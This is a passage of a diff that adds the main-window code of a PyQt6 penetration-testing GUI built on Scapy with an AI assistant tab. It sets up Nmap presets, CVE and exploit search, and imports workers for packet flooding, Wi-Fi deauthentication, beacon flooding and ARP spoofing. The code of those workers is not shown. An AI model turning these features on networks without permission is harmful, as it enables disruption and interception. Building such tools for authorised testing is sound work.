@@ -1,0 +1,8439 @@
+import sys
+import logging
+import time
+from threading import Event, Lock
+import queue
+import copy
+import socket
+import random
+import os
+import csv
+import platform
+import psutil
+import ipaddress
+from PyQt6.QtCore import PYQT_VERSION_STR
+import subprocess
+import numpy as np
+import json
+import urllib.request
+import tempfile
+import webbrowser
+import shutil
+import signal
+import uuid
+
+try:
+    from lxml import etree
+    LXML_AVAILABLE = True
+except ImportError:
+    LXML_AVAILABLE = False
+    etree = None
+    logging.warning("Optional XML reporting dependency not found. Please run 'pip install lxml'")
+
+import re
+from qt_material import apply_stylesheet, list_themes
+from PyQt6.QtGui import QActionGroup, QPixmap, QImage, QPalette
+
+from .utils.helpers import create_themed_icon, get_vendor, _get_random_ip
+
+from PyQt6.QtWidgets import (
+    QApplication, QMainWindow, QStatusBar, QMenuBar, QTabWidget, QWidget,
+    QVBoxLayout, QLabel, QDockWidget, QPlainTextEdit, QPushButton, QHBoxLayout,
+    QTreeWidget, QTreeWidgetItem, QSplitter, QFileDialog, QMessageBox, QComboBox,
+    QListWidget, QListWidgetItem, QScrollArea, QLineEdit, QCheckBox, QFrame, QMenu, QTextEdit, QGroupBox,
+    QProgressBar, QTextBrowser, QRadioButton, QButtonGroup, QFormLayout, QGridLayout, QDialog,
+    QHeaderView, QInputDialog, QGraphicsOpacityEffect, QStackedWidget
+)
+from .ui.ai_tab import AIAssistantTab, AISettingsDialog, AIGuideDialog
+from .ui.admin_panel import AdminPanelDialog
+from PyQt6.QtCore import QObject, pyqtSignal, Qt, QThread, QTimer, QPropertyAnimation, QEasingCurve, QParallelAnimationGroup, QSequentialAnimationGroup, QPoint, QSize
+from PyQt6.QtGui import QAction, QIcon, QFont, QTextCursor, QActionGroup
+
+
+from .threads.sniffer import SnifferThread
+
+
+from .threads.wireless import KrackScanThread, AircrackThread, ChannelHopperThread, HandshakeSnifferThread
+
+try:
+    from reportlab.platypus import SimpleDocTemplate, Table, TableStyle, Paragraph
+    from reportlab.lib.styles import getSampleStyleSheet
+    from reportlab.lib import colors
+    from reportlab.lib.units import inch
+    import docx
+except ImportError:
+    logging.warning("Optional PDF/DOCX export dependencies not found. Please run 'pip install reportlab python-docx'")
+
+try:
+    import pyqtgraph as pg
+    PYQTGRAPH_AVAILABLE = True
+except ImportError:
+    PYQTGRAPH_AVAILABLE = False
+    pg = None # Define pg as None to prevent other errors if it's referenced
+    logging.warning("Optional graphing dependency not found. Please run 'pip install pyqtgraph'")
+
+
+try:
+    import GPUtil
+except ImportError:
+    GPUtil = None
+    logging.warning("Optional GPU monitoring dependency not found. Please run 'pip install gputil'")
+
+# --- Scapy Imports ---
+try:
+    from scapy.all import *
+    from scapy.utils import hexdump
+    from scapy.layers.dns import DNS, DNSQR
+    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap
+    conf.verb = 0
+except ImportError:
+    logging.critical("Scapy is not installed.")
+
+from .utils.constants import (
+    AVAILABLE_PROTOCOLS, PACKET_TEMPLATES, FIREWALL_PROBES,
+    SCAN_TYPES, COMMON_FILTERS, COMMUNITY_TOOLS
+)
+
+from .ui.dialogs import (
+    CrunchDialog, SubdomainResultsDialog, NmapSummaryDialog, HttpxResultsDialog,
+    DirsearchResultsDialog, FfufResultsDialog, NucleiResultsDialog,
+    TruffleHogResultsDialog, Enum4LinuxNGResultsDialog, DnsReconResultsDialog,
+    SherlockResultsDialog
+)
+
+from .core.log_handler import QtLogHandler
+
+# --- Logging and Threads ---
+
+
+
+from .threads.monitor import ResourceMonitorThread
+from .threads.workers import (
+    WorkerThread, _nmap_scan_thread, _sublist3r_thread, _send_thread,
+    _traceroute_thread, _port_scan_thread, _arp_scan_thread,
+    _ping_sweep_thread, _flood_thread, _firewall_test_thread,
+    _deauth_thread, _beacon_flood_thread, _arp_spoof_thread,
+    _cve_search_thread, _exploit_search_thread
+)
+# ... and other worker imports as I create them ...
+
+
+from .ui.widgets import ResourceGraph
+
+
+# --- Main Application ---
+class GScapy(QMainWindow):
+    """The main application window, holding all UI elements and logic."""
+    def __init__(self):
+        """Initializes the main window, UI components, and internal state."""
+        super().__init__()
+        self.setWindowTitle("GScapy + AI - The Modern Scapy Interface with AI")
+        # Construct path to icon relative to the script's location for robustness
+        script_dir = os.path.dirname(os.path.realpath(__file__))
+        icon_path = os.path.join(script_dir, "icons", "new_logo.png")
+        self.setWindowIcon(QIcon(icon_path))
+        self.setGeometry(100, 100, 1200, 800)
+
+        self.current_user = None
+        self.sniffer_thread = None; self.channel_hopper = None
+        self.tool_results_queue = Queue()
+        self.is_tool_running = False
+        self.loaded_flood_packet = None
+        self.found_networks = {}
+        self.active_threads = []
+        self.thread_finish_lock = Lock()
+        self.finished_thread_count = 0
+        self.tool_stop_event = Event()
+        self.arp_spoof_current_victim = None
+        self.arp_spoof_current_target = None
+        self.resource_monitor_thread = None
+        self.nmap_last_xml = None
+        self.nmap_xml_temp_file = None
+        self.aircrack_thread = None
+        self.ps_thread_lock = Lock()
+        self.ps_finished_threads = 0
+        self.bf_ssid_list = []
+        self.krack_thread = None
+        self.super_scan_active = False
+        self.lab_test_chain = []
+        # self.tool_config_widgets is no longer used.
+
+        self.nmap_script_presets = {
+            "HTTP Service Info": ("http-title,http-headers", "", "Gathers the title and headers from web servers."),
+            "SMB OS Discovery": ("smb-os-discovery", "", "Attempts to determine the OS, computer name, and domain from SMB."),
+            "FTP Anonymous Login": ("ftp-anon", "", "Checks if an FTP server allows anonymous login."),
+            "DNS Brute-force": ("dns-brute", "", "Attempts to enumerate DNS hostnames by brute-forcing common subdomain names."),
+            "SSL/TLS Certificate Info": ("ssl-cert,sslv2", "", "Retrieves the server's SSL certificate and checks for weak SSLv2 support."),
+            "SMTP User Enumeration": ("smtp-enum-users", "smtp-enum-users.methods={VRFY,EXPN,RCPT}", "Attempts to enumerate users on an SMTP server."),
+            "Vulnerability Scan (Vulners)": ("vulners", "", "Checks for vulnerabilities based on service versions using Vulners.com. Requires -sV."),
+            "SMB Share & User Enum": ("smb-enum-shares,smb-enum-users", "", "Enumerates shared folders and user accounts on an SMB server."),
+            "Service Banner Grabbing": ("banner", "", "Connects to open ports and prints the service banner.")
+        }
+
+        self.central_widget = QWidget()
+        self.setCentralWidget(self.central_widget)
+        self.main_layout = QVBoxLayout(self.central_widget)
+
+        self._create_resource_bar()
+        self.menu_bar = QMenuBar(self)
+        self.setMenuBar(self.menu_bar)
+        # The menu bar will be populated after login by calling _update_menu_bar()
+        self._create_status_bar()
+        self._create_header_bar()
+
+        # Config widgets are now created inside their respective tool tabs.
+
+        self._create_main_tabs(); self._create_log_panel(); self._setup_logging()
+
+        self._setup_result_handlers()
+        self.results_processor = QTimer(self); self.results_processor.timeout.connect(self._process_tool_results); self.results_processor.start(100)
+
+
+        # Setup timer for the clock
+        self.clock_timer = QTimer(self)
+        self.clock_timer.timeout.connect(self._update_clock)
+        self.clock_timer.start(1000) # 1000 ms = 1 second
+        self._update_clock() # Initial call to show time immediately
+
+        # Start the resource monitor
+        self.resource_monitor_thread = ResourceMonitorThread(self)
+        self.resource_monitor_thread.stats_updated.connect(self._update_resource_stats)
+        self.resource_monitor_thread.start()
+
+        self._update_tool_targets() # Initial population after all widgets are created
+        logging.info("GScapy application initialized.")
+
+
+    def _update_menu_bar(self):
+        """Creates or updates the main menu bar based on the current user's role."""
+        self.menu_bar.clear()
+
+        # --- File Menu ---
+        file_menu = self.menu_bar.addMenu("&File")
+        file_menu.addAction("&Save Captured Packets", self.save_packets)
+        file_menu.addAction("&Load Packets from File", self.load_packets)
+        file_menu.addSeparator()
+        file_menu.addAction("&Exit", self.close)
+
+        # --- Admin Menu (Conditional) ---
+        # Use .get() for safer dictionary access, in case current_user is None
+        logging.info(f"Updating menu bar for user: {self.current_user}")
+        if self.current_user and self.current_user.get('is_admin'):
+            admin_menu = self.menu_bar.addMenu("&Admin")
+            admin_menu.addAction(QIcon("icons/new_logo.png"), "Admin Panel...", self._show_admin_panel)
+
+        # --- Help Menu ---
+        help_menu = self.menu_bar.addMenu("&Help")
+        help_menu.addAction("&About GScapy", self._show_about_dialog)
+        help_menu.addSeparator()
+        help_menu.addAction("&AI Settings...", self._show_ai_settings_dialog)
+        help_menu.addAction("AI Guide", self._show_ai_guide_dialog)
+
+    def _show_admin_panel(self):
+        """Shows the admin panel dialog."""
+        admin_dialog = AdminPanelDialog(self)
+        admin_dialog.exec()
+
+    def _show_ai_settings_dialog(self):
+        """Shows the AI settings dialog."""
+        dialog = AISettingsDialog(self)
+        dialog.exec()
+
+    def _show_ai_guide_dialog(self):
+        """Shows the AI features user guide."""
+        dialog = AIGuideDialog(self)
+        dialog.exec()
+
+    def get_ai_settings(self):
+        """
+        Loads AI settings from the JSON file and returns a dictionary
+        containing the active provider's details (endpoint, model, api_key).
+        """
+        settings_file = "ai_settings.json"
+        try:
+            if not os.path.exists(settings_file):
+                # Show settings dialog if no config exists
+                if self._show_ai_settings_dialog() == QDialog.DialogCode.Rejected:
+                    return None # User cancelled
+
+            with open(settings_file, 'r') as f:
+                settings = json.load(f)
+
+            active_provider_name = settings.get("active_provider")
+            active_model_name = settings.get("active_model")
+
+            if not active_provider_name or not active_model_name:
+                self.ai_assistant_tab.handle_ai_error("No active AI model selected. Please click the settings icon to choose one.")
+                return None
+
+            provider_details = {}
+            if active_provider_name == "local_ai":
+                local_settings = settings.get("local_ai", {})
+                provider_details = {
+                    "provider": "local_ai",
+                    "endpoint": local_settings.get("endpoint"),
+                    "model": active_model_name,
+                    "api_key": None
+                }
+            else: # It's an online service
+                online_settings = settings.get("online_ai", {})
+                provider_data = online_settings.get(active_provider_name, {})
+                api_key = provider_data.get("api_key")
+
+                endpoint = ""
+                if active_provider_name == "OpenAI":
+                    endpoint = "https://api.openai.com/v1/chat/completions"
+                # ... (add other online providers here)
+
+                provider_details = {
+                    "provider": active_provider_name,
+                    "endpoint": endpoint,
+                    "model": active_model_name,
+                    "api_key": api_key
+                }
+
+            if not provider_details.get("endpoint"):
+                 self.ai_assistant_tab.handle_ai_error(f"Endpoint for '{active_provider_name}' is missing or not supported yet.")
+                 return None
+
+            return provider_details
+
+        except (IOError, json.JSONDecodeError) as e:
+            self.ai_assistant_tab.handle_ai_error(f"Error loading AI settings: {e}")
+            return None
+        except Exception as e:
+            self.ai_assistant_tab.handle_ai_error(f"An unexpected error occurred while getting AI settings: {e}")
+            return None
+
+
+    def _show_about_dialog(self):
+        dialog = QMessageBox(self)
+        dialog.setWindowTitle("About GScapy + AI")
+
+        # Add the logo
+        pixmap = QIcon(os.path.join("icons", "new_logo.png")).pixmap(80, 80)
+        dialog.setIconPixmap(pixmap)
+
+        about_text = """
+        <b>GScapy + AI v3.0</b>
+        <p>The Modern Scapy Interface with AI.</p>
+        <p>This application provides tools for sniffing, crafting, and analyzing network packets, with AI-powered analysis and guidance.</p>
+        <br>
+        <p><b>Developer:</b><br>Mohammadmahdi Farhadianfard (ao ga nai 😁)<br>
+        mohammadmahdi.farhadianfard@gmail.com</p>
+        """
+        dialog.setText(about_text)
+        dialog.exec()
+
+    def _create_status_bar(self):
+        self.status_bar = QStatusBar(self); self.setStatusBar(self.status_bar); self.status_bar.showMessage("Ready")
+
+    def _create_resource_bar(self):
+        """Creates the top resource monitor bar."""
+        resource_frame = QFrame(); resource_frame.setFrameShape(QFrame.Shape.StyledPanel)
+        resource_layout = QHBoxLayout(resource_frame)
+        resource_layout.setContentsMargins(5, 2, 5, 2)
+
+        # Add Logo and Tooltip
+        logo_label = QLabel()
+        logo_pixmap = QIcon(os.path.join("icons", "new_logo.png")).pixmap(40, 40)
+        logo_label.setPixmap(logo_pixmap)
+        logo_label.setToolTip("GScapy made by Poorija, Email: mohammadmahdi.farhadianfard@gmail.com")
+        resource_layout.addWidget(logo_label)
+        resource_layout.addSpacing(15)
+
+        resource_layout.addWidget(QLabel("<b>CPU:</b>"))
+        self.cpu_graph = ResourceGraph(color='c')
+        self.cpu_graph.setFixedHeight(60)
+        self.cpu_graph.setMaximumWidth(250)
+        resource_layout.addWidget(self.cpu_graph, 1) # Add stretch factor
+
+        resource_layout.addWidget(QLabel("<b>RAM:</b>"))
+        self.ram_graph = ResourceGraph(color='m')
+        self.ram_graph.setFixedHeight(60)
+        self.ram_graph.setMaximumWidth(250)
+        resource_layout.addWidget(self.ram_graph, 1) # Add stretch factor
+
+        if GPUtil:
+            resource_layout.addWidget(QLabel("<b>GPU:</b>"))
+            self.gpu_graph = ResourceGraph(color='y')
+            self.gpu_graph.setFixedHeight(60)
+            self.gpu_graph.setMaximumWidth(250)
+            resource_layout.addWidget(self.gpu_graph, 1)
+
+        resource_layout.addWidget(QLabel("<b>Disk R/W:</b>"))
+        self.disk_label = QLabel("---/--- MB/s"); resource_layout.addWidget(self.disk_label)
+        resource_layout.addStretch()
+
+        resource_layout.addWidget(QLabel("<b>Net Sent/Recv:</b>"))
+        self.net_label = QLabel("---/--- KB/s"); resource_layout.addWidget(self.net_label)
+        resource_layout.addStretch()
+
+        self.time_label = QLabel("Loading...")
+        self.time_label.setToolTip("Current system date, time, and timezone")
+        self.time_label.setStyleSheet("font-weight: bold;")
+
+        separator = QFrame()
+        separator.setFrameShape(QFrame.Shape.VLine)
+        separator.setFrameShadow(QFrame.Shadow.Sunken)
+        resource_layout.addWidget(separator)
+
+        resource_layout.addWidget(self.time_label)
+        resource_layout.addStretch()
+
+        resource_layout.addWidget(QLabel("<b>Refresh:</b>"))
+        self.refresh_combo = QComboBox()
+        self.refresh_combo.addItems(["1s", "2s", "5s", "Off"])
+        resource_layout.addWidget(self.refresh_combo)
+
+        self.main_layout.addWidget(resource_frame)
+        self.refresh_combo.textActivated.connect(self._handle_refresh_interval_change)
+
+    def _update_clock(self):
+        """Updates the time label with the current time and timezone."""
+        # Use a try-except block to handle potential time formatting issues on different OSes
+        try:
+            # This format includes Year-Month-Day, Hour:Minute:Second, and Timezone Name
+            current_time = time.strftime("%Y-%m-%d %H:%M:%S %Z")
+        except Exception as e:
+            logging.warning(f"Could not format time with timezone: {e}")
+            # Fallback to a simpler format if the timezone name (%Z) causes issues
+            current_time = time.strftime("%H:%M:%S")
+        self.time_label.setText(current_time)
+
+    def _update_resource_stats(self, stats):
+        """Updates the resource labels with new stats from the monitor thread."""
+        self.cpu_graph.update_data(stats["cpu_percent"])
+        self.ram_graph.update_data(stats["ram_percent"])
+        if hasattr(self, 'gpu_graph'):
+            self.gpu_graph.update_data(stats.get("gpu_percent", 0))
+        self.disk_label.setText(stats["disk_str"])
+        self.net_label.setText(stats["net_str"])
+
+    def _handle_refresh_interval_change(self, text):
+        """Updates the resource monitor's refresh interval."""
+        if not self.resource_monitor_thread:
+            return
+
+        if text == "Off":
+            self.resource_monitor_thread.pause()
+        else:
+            interval = int(text.replace('s', ''))
+            self.resource_monitor_thread.set_interval(interval)
+
+    def _create_header_bar(self):
+        """Creates the top header bar with interface and theme selectors."""
+        header_frame = QWidget()
+        header_layout = QHBoxLayout(header_frame)
+        header_layout.setContentsMargins(0, 5, 0, 5)
+
+        # Interface Selector
+        header_layout.addWidget(QLabel("Network Interface:"))
+        try:
+            ifaces = ["Automatic"] + [iface.name for iface in get_working_ifaces()]
+        except Exception as e:
+            logging.error(f"Could not get network interfaces: {e}", exc_info=True)
+            ifaces = ["Automatic"]
+        self.iface_combo = QComboBox()
+        self.iface_combo.addItems(ifaces)
+        self.iface_combo.currentTextChanged.connect(self._update_tool_targets)
+        header_layout.addWidget(self.iface_combo)
+
+        header_layout.addStretch()
+
+        # Theme Switcher
+        header_layout.addWidget(QLabel("Theme:"))
+        self.theme_combo = QComboBox()
+        self.theme_combo.addItems([theme.replace('.xml', '') for theme in list_themes()])
+        self.theme_combo.textActivated.connect(self._handle_theme_change)
+        header_layout.addWidget(self.theme_combo)
+
+        self.main_layout.addWidget(header_frame)
+
+    def _handle_theme_change(self, theme_name):
+        theme_file = f"{theme_name}.xml"
+        invert_secondary = "light" in theme_name
+
+        # This dictionary must be kept in sync with the one in login.py and main()
+        extra_qss = {
+            'QGroupBox': {
+                'border': '1px solid #444;',
+                'border-radius': '8px',
+                'margin-top': '10px',
+            },
+            'QGroupBox::title': {
+                'subcontrol-origin': 'margin',
+                'subcontrol-position': 'top left',
+                'padding': '0 10px',
+            },
+            'QTabWidget::pane': {
+                'border-top': '1px solid #444;',
+                'margin-top': '-1px',
+            },
+            'QFrame': {
+                'border-radius': '8px',
+            },
+            'QPushButton': {
+                'border-radius': '8px',
+            },
+            'QLineEdit': {
+                'border-radius': '8px',
+            },
+            'QComboBox': {
+                'border-radius': '8px',
+            },
+            'QTextEdit': {
+                'border-radius': '8px',
+            },
+            'QPlainTextEdit': {
+                'border-radius': '8px',
+            },
+            'QListWidget': {
+                'border-radius': '8px',
+            },
+            'QTreeWidget': {
+                'border-radius': '8px',
+            }
+        }
+
+        apply_stylesheet(QApplication.instance(), theme=theme_file, invert_secondary=invert_secondary, extra=extra_qss)
+
+        # After applying the stylesheet, notify the AI tab to update its themed icons
+        if hasattr(self, 'ai_assistant_tab'):
+            self.ai_assistant_tab.update_theme()
+
+    def get_selected_iface(self):
+        iface = self.iface_combo.currentText()
+        return iface if iface != "Automatic" else None
+
+    def _create_main_tabs(self):
+        """Creates the main QTabWidget and adds all the tool tabs."""
+        self.tab_widget = QTabWidget()
+        self.tab_widget.setStyleSheet("""
+            QTabWidget::tab-bar {
+                alignment: center;
+            }
+            QTabBar::tab:!selected:!last {
+                border-right: 1px solid #444;
+            }
+        """)
+        self.main_layout.addWidget(self.tab_widget)
+        from .ui.sniffer_tab import SnifferTab
+        self.sniffer_tab = SnifferTab(self)
+        self.tab_widget.addTab(self.sniffer_tab, QIcon("icons/search.svg"), "Packet Sniffer")
+        from .ui.crafter_tab import CrafterTab
+        self.crafter_tab = CrafterTab(self)
+        self.tab_widget.addTab(self.crafter_tab, QIcon("icons/edit-3.svg"), "Packet Crafter")
+        self.tab_widget.addTab(self._create_tools_tab(), QIcon("icons/tool.svg"), "Network Tools")
+        self.tab_widget.addTab(self._create_advanced_tools_tab(), QIcon("icons/shield.svg"), "Advanced Tools")
+        self.tab_widget.addTab(self._create_wireless_tools_tab(), QIcon("icons/wifi.svg"), "Wireless Tools")
+        self.tab_widget.addTab(self._create_reporting_tab(), QIcon("icons/file-text.svg"), "Reporting")
+        self.tab_widget.addTab(self._create_lab_tab(), QIcon("icons/layers.svg"), "LAB")
+
+        self.ai_assistant_tab = AIAssistantTab(self)
+        self.tab_widget.addTab(self.ai_assistant_tab, QIcon("icons/terminal.svg"), "AI Assistant")
+
+        self.tab_widget.addTab(self._create_threat_intelligence_tab(), QIcon("icons/database.svg"), "Threat Intelligence")
+
+        self.tab_widget.addTab(self._create_community_tools_tab(), QIcon("icons/users.svg"), "Community Tools")
+        self.tab_widget.addTab(self._create_system_info_tab(), QIcon("icons/info.svg"), "System Info")
+
+    def _create_threat_intelligence_tab(self):
+        """Creates the tab container for the Threat Intelligence tools."""
+        threat_tabs = QTabWidget()
+        threat_tabs.addTab(self._create_cve_search_tab(), "CVE Search")
+        threat_tabs.addTab(self._create_exploit_db_search_tab(), "Exploit-DB Search")
+        return threat_tabs
+
+    def _create_cve_search_tab(self):
+        """Creates the UI for the CVE Search tool."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        # --- Search Controls ---
+        controls_layout = QHBoxLayout()
+        controls_layout.addWidget(QLabel("Search CVEs:"))
+        self.cve_search_input = QLineEdit()
+        self.cve_search_input.setPlaceholderText("Enter keyword, CPE, or CVE-ID (e.g., 'apache http server 2.4.52', 'CVE-2021-44228')")
+        controls_layout.addWidget(self.cve_search_input)
+        self.cve_search_button = QPushButton("Search")
+        controls_layout.addWidget(self.cve_search_button)
+        layout.addLayout(controls_layout)
+
+        # Add a note about the API key
+        api_note = QLabel("<i>Note: Searches are rate-limited by the NIST NVD API. For faster results, get a free API key and place it in a file named 'nvd_api.key'.</i>")
+        api_note.setWordWrap(True)
+        layout.addWidget(api_note)
+
+        # --- Results Display ---
+        results_splitter = QSplitter(Qt.Orientation.Vertical)
+        self.cve_results_table = QTreeWidget()
+        self.cve_results_table.setColumnCount(4)
+        self.cve_results_table.setHeaderLabels(["CVE ID", "Severity", "CVSS v3.1", "Description"])
+        self.cve_results_table.header().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
+        self.cve_results_table.header().setStretchLastSection(True)
+        results_splitter.addWidget(self.cve_results_table)
+
+        self.cve_details_view = QTextBrowser()
+        self.cve_details_view.setOpenExternalLinks(True)
+        results_splitter.addWidget(self.cve_details_view)
+
+        results_splitter.setSizes([300, 200])
+        layout.addWidget(results_splitter)
+
+        # --- Connections ---
+        self.cve_search_button.clicked.connect(self.start_cve_search)
+        self.cve_results_table.currentItemChanged.connect(self.display_cve_details)
+
+        return widget
+
+    def start_cve_search(self):
+        """Starts the CVE search worker thread."""
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+        query = self.cve_search_input.text()
+        if not query:
+            QMessageBox.critical(self, "Input Error", "Please provide a search query.")
+            return
+
+        self.is_tool_running = True
+        self.cve_search_button.setEnabled(False)
+        self.cve_results_table.clear()
+        self.cve_details_view.clear()
+        self.status_bar.showMessage(f"Searching for CVEs related to '{query}'...")
+
+        # Read API key from file if it exists
+        api_key = None
+        try:
+            with open("nvd_api.key", "r") as f:
+                api_key = f.read().strip()
+                logging.info("Found NVD API key.")
+        except FileNotFoundError:
+            logging.info("NVD API key file ('nvd_api.key') not found. Using public, rate-limited access.")
+
+        self.worker = WorkerThread(_cve_search_thread, args=(self, query, api_key))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def display_cve_details(self, current_item, previous_item):
+        """Displays full details for the selected CVE."""
+        if not current_item:
+            return
+
+        # Retrieve the full CVE object stored in the item's data role
+        cve_obj = current_item.data(0, Qt.ItemDataRole.UserRole)
+        if not cve_obj:
+            return
+
+        # Build an HTML string for display
+        html = f"<h3>{cve_obj.id}</h3>"
+
+        # Description
+        description = "No description available."
+        for desc in cve_obj.descriptions:
+            if desc.lang == 'en':
+                description = desc.value
+                break
+        html += f"<p><b>Description:</b><br>{description}</p>"
+
+        # Metrics
+        if hasattr(cve_obj, 'v31vector'):
+             html += f"<p><b>CVSS v3.1 Vector:</b> {cve_obj.v31vector} (<b>Score: {cve_obj.v31score}</b>)</p>"
+        elif hasattr(cve_obj, 'v2vector'):
+            html += f"<p><b>CVSS v2.0 Vector:</b> {cve_obj.v2vector} (<b>Score: {cve_obj.v2score}</b>)</p>"
+
+        # References
+        if hasattr(cve_obj, 'references') and cve_obj.references:
+            html += "<p><b>References:</b><ul>"
+            for ref in cve_obj.references:
+                html += f'<li><a href="{ref.url}">{ref.url}</a></li>'
+            html += "</ul></p>"
+
+        self.cve_details_view.setHtml(html)
+
+    def _create_exploit_db_search_tab(self):
+        """Creates the UI for the Exploit-DB Search tool."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        # --- API Key Input ---
+        api_key_layout = QHBoxLayout()
+        api_key_layout.addWidget(QLabel("Vulners API Key:"))
+        self.exploitdb_api_key_input = QLineEdit()
+        self.exploitdb_api_key_input.setPlaceholderText("Get a free key from vulners.com")
+        self.exploitdb_api_key_input.setEchoMode(QLineEdit.EchoMode.Password)
+        api_key_layout.addWidget(self.exploitdb_api_key_input)
+        save_api_key_btn = QPushButton("Save Key")
+        api_key_layout.addWidget(save_api_key_btn)
+        layout.addLayout(api_key_layout)
+
+        # --- Search Controls ---
+        controls_layout = QHBoxLayout()
+        controls_layout.addWidget(QLabel("Search Exploits:"))
+        self.exploitdb_search_input = QLineEdit()
+        self.exploitdb_search_input.setPlaceholderText("Enter software name, version, etc. (e.g., 'wordpress 4.7.0')")
+        controls_layout.addWidget(self.exploitdb_search_input)
+        self.exploitdb_search_button = QPushButton("Search")
+        controls_layout.addWidget(self.exploitdb_search_button)
+        layout.addLayout(controls_layout)
+
+        # --- Results Display ---
+        self.exploitdb_results_table = QTreeWidget()
+        self.exploitdb_results_table.setColumnCount(3)
+        self.exploitdb_results_table.setHeaderLabels(["ID", "Title", "URL"])
+        self.exploitdb_results_table.header().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
+        self.exploitdb_results_table.header().setStretchLastSection(True)
+        layout.addWidget(self.exploitdb_results_table)
+
+        # --- Connections ---
+        save_api_key_btn.clicked.connect(self.save_vulners_api_key)
+        self.exploitdb_search_button.clicked.connect(self.start_exploit_search)
+        self.exploitdb_results_table.itemDoubleClicked.connect(self.open_exploit_url)
+
+        # Load saved API key on startup
+        self.load_vulners_api_key()
+
+        return widget
+
+    def save_vulners_api_key(self):
+        """Saves the Vulners API key to a file."""
+        api_key = self.exploitdb_api_key_input.text()
+        if not api_key:
+            QMessageBox.warning(self, "Input Error", "Please enter an API key to save.")
+            return
+        try:
+            with open("vulners_api.key", "w") as f:
+                f.write(api_key)
+            QMessageBox.information(self, "Success", "Vulners API key saved successfully.")
+        except Exception as e:
+            QMessageBox.critical(self, "File Error", f"Could not save API key: {e}")
+
+    def load_vulners_api_key(self):
+        """Loads the Vulners API key from a file."""
+        try:
+            with open("vulners_api.key", "r") as f:
+                api_key = f.read().strip()
+                self.exploitdb_api_key_input.setText(api_key)
+                logging.info("Loaded Vulners API key.")
+        except FileNotFoundError:
+            pass # It's okay if the file doesn't exist yet
+        except Exception as e:
+            QMessageBox.critical(self, "File Error", f"Could not load API key: {e}")
+
+    def start_exploit_search(self):
+        """Starts the Exploit-DB search worker thread."""
+        if not shutil.which("getsploit"):
+            QMessageBox.critical(self, "GetSploit Error", "'getsploit' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        query = self.exploitdb_search_input.text()
+        api_key = self.exploitdb_api_key_input.text()
+
+        if not query:
+            QMessageBox.critical(self, "Input Error", "Please provide a search query.")
+            return
+        if not api_key:
+            QMessageBox.critical(self, "API Key Error", "Vulners API key is required for searching exploits.")
+            return
+
+        self.is_tool_running = True
+        self.exploitdb_search_button.setEnabled(False)
+        self.exploitdb_results_table.clear()
+        self.status_bar.showMessage(f"Searching for exploits related to '{query}'...")
+
+        self.worker = WorkerThread(_exploit_search_thread, args=(self, query, api_key))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def open_exploit_url(self, item, column):
+        """Opens the selected exploit URL in the default web browser."""
+        url = item.text(2) # URL is in the 3rd column
+        if url and url.startswith("http"):
+            webbrowser.open(url)
+        else:
+            QMessageBox.warning(self, "Invalid URL", f"The selected item does not have a valid URL: {url}")
+
+    def _create_community_tools_tab(self):
+        """Creates the UI for the Scapy Community Tools tab."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        text_browser = QTextBrowser()
+        text_browser.setOpenExternalLinks(True)
+
+        html_content = "<h1>Scapy Community Tools and Projects</h1>"
+        html_content += "<p>This is a curated list of awesome tools, talks, and projects related to Scapy, inspired by the <a href='https://github.com/gpotter2/awesome-scapy'>awesome-scapy</a> repository.</p>"
+
+        for category, tools in COMMUNITY_TOOLS.items():
+            html_content += f"<h2>{category}</h2>"
+            html_content += "<ul>"
+            for name, url, description in tools:
+                html_content += f"<li><b><a href='{url}'>{name}</a></b>: {description}</li>"
+            html_content += "</ul>"
+
+        text_browser.setHtml(html_content)
+        layout.addWidget(text_browser)
+        return widget
+
+    def _create_log_panel(self):
+        """Creates the dockable logging panel at the bottom of the window."""
+        log_dock_widget = QDockWidget("Live Log", self)
+        log_dock_widget.setAllowedAreas(Qt.DockWidgetArea.BottomDockWidgetArea)
+        self.log_console = QPlainTextEdit(); self.log_console.setReadOnly(True)
+        log_dock_widget.setWidget(self.log_console)
+        self.addDockWidget(Qt.DockWidgetArea.BottomDockWidgetArea, log_dock_widget)
+
+    def _setup_logging(self):
+        """Configures the logging system to output to a file and the UI panel."""
+        root_logger = logging.getLogger()
+        for handler in root_logger.handlers[:]: root_logger.removeHandler(handler)
+        file_handler = logging.FileHandler('gscapy.log', mode='w')
+        formatter = logging.Formatter('%(asctime)s - %(threadName)s - %(levelname)s - %(message)s')
+        file_handler.setFormatter(formatter)
+        root_logger.addHandler(file_handler)
+        qt_handler = QtLogHandler()
+        qt_handler.log_updated.connect(self.log_console.appendPlainText)
+        qt_handler.setFormatter(formatter)
+        root_logger.addHandler(qt_handler)
+        root_logger.setLevel(logging.INFO)
+
+
+
+    def _create_nmap_scanner_tool(self):
+        widget = QWidget()
+        main_layout = QVBoxLayout(widget)
+
+        # --- Configurable options widget ---
+        config_widget, self.nmap_controls = self._create_nmap_config_widget()
+        main_layout.addWidget(config_widget)
+
+        # Connect signals now that we have the controls dictionary
+        controls = self.nmap_controls
+        controls['start_btn'].clicked.connect(self.start_nmap_scan)
+        controls['cancel_btn'].clicked.connect(self.cancel_tool)
+        controls['report_btn'].clicked.connect(self.generate_nmap_report)
+        controls['all_ports_btn'].clicked.connect(self._nmap_set_all_ports)
+        controls['super_complete_btn'].clicked.connect(self._nmap_toggle_super_complete)
+        controls['preset_combo'].textActivated.connect(self._handle_nmap_preset_selected)
+        controls['a_check'].toggled.connect(self._nmap_on_aggressive_toggled)
+        controls['scan_type_combo'].currentTextChanged.connect(self._nmap_on_ping_scan_toggled)
+
+        # --- Output Console ---
+        self.nmap_output_console = QPlainTextEdit()
+        self.nmap_output_console.setReadOnly(True)
+        self.nmap_output_console.setFont(QFont("Courier New", 10))
+        self.nmap_output_console.setPlaceholderText("Nmap command output will be displayed here...")
+        main_layout.addWidget(self.nmap_output_console, 1) # Give it stretch factor
+
+        return widget
+
+    def _create_nmap_config_widget(self):
